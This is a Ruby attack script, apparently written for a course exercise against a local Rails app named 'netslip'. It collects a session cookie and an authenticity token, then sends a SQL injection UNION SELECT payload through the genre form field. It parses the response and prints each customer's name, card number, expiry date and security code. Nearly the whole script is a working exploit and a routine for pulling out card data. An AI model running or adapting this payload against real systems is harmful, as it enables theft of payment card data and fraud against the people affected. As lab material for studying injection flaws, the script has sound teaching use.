require 'socket'
require 'cgi'

# NOTE: You must have the netslip Rails app running for this to work!

http = Array.new
http << "GET /movies/selectGenre HTTP/1.1"
http << "Host: localhost:3000"
http << "Connection: close"      # Close connection after response

# Create HTTP request string
request = http.join("\r\n") + "\r\n\r\n"

# Open socket
socket = TCPSocket.open("localhost", 3000)

# Send request
socket.puts(request)

# Read response
response = socket.read

# Close socket
socket.close

# Print response
# puts response

session_id = response[/_session_id=(.*?);/] 

authenticity_token = response[/authenticity_token" type="hidden" value="(.*?)"/]

# puts session_id[12...-1]
session_id_trim = session_id[12...-1]
# puts CGI::escape(session_id)
# puts authenticity_token[41...-1]
authenticity_token_trim = authenticity_token[41...-1]
# puts CGI::escape(authenticity_token)

hack = "' UNION SELECT billing_street, billing_state, name, card_number, exp_month, exp_year, security_code FROM customers UNION SELECT * FROM movies WHERE genre='"


request_body = "authenticity_token=" + CGI::escape(authenticity_token_trim) + "&" \
		   "genre=" + CGI::escape(hack) + "&" \
		   "commit=Show+Movies\r\n\r\n"

http = Array.new
http << "POST /movies/showGenre HTTP/1.1"
http << "Host: localhost:3000"
http << "Connection: close" 
http << "Content-Type: application/x-www-form-urlencoded"
http << "Content-Length: " + request_body.size.to_s
http << "Cookie: #{session_id} path=/; HttpOnly"

request = http.join("\r\n") + "\r\n\r\n" + request_body

# Open socket
socket = TCPSocket.open("localhost", 3000)

# Send request
socket.puts(request)

# Read response
# response = socket.read

# puts response
# Close socket
puts "--------------------------------------"
count = 1
while(line=socket.gets) do 

	# puts line
	if((line.include? "odd") || (line.include? "even"))
		if (count==1)
			count-=1
			next
		end
		skip = socket.gets
		name = socket.gets[12...-6]
		card_number = socket.gets[12...-6]
		exp_month = socket.gets[12...-6]
		exp_year = socket.gets[12...-6]
		security_code = socket.gets[12...-6]

		puts "Card Info of " + name
		puts "Card Number:  " + card_number
		puts "Exp Date:     " + exp_month + "/" + exp_year
		puts "Security Code:" + security_code
		puts "--------------------------------------"

	end
	
end

socket.close

# if my_string.include? "cde"



